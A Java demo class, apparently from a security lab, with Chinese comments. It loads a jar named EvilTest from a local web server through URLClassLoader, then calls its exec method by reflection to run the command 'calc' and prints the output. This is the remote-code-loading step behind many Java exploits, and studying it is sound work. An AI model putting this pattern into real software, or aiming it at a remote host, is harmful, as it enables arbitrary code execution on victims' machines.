package cn.hungslabsec.classloader;

import java.net.URL;
import java.net.URLClassLoader;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;

public class TestURLClassLoader {

    public static void main(String[] args) {
        try {
            // 定义远程加载的jar路径
            URL url = new URL("http://127.0.0.1:8000/EvilTest.jar");

            // 创建URLClassLoader对象，并加载远程jar包
            URLClassLoader ucl = new URLClassLoader(new URL[]{url});

            // 定义需要执行的系统命令
            String cmd = "calc";

            // 通过URLClassLoader加载远程jar包中的CMD类
            Class cmdClass = ucl.loadClass("EvilTest");

            // 调用CMD类中的exec方法，等价于: Process process = CMD.exec("whoami");
            Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);

            // 获取命令执行结果的输入流
            InputStream           in   = process.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[]                b    = new byte[1024];
            int                   a    = -1;

            // 读取命令执行结果
            while ((a = in.read(b)) != -1) {
                baos.write(b, 0, a);
            }

            // 输出命令执行结果
            System.out.println(baos.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
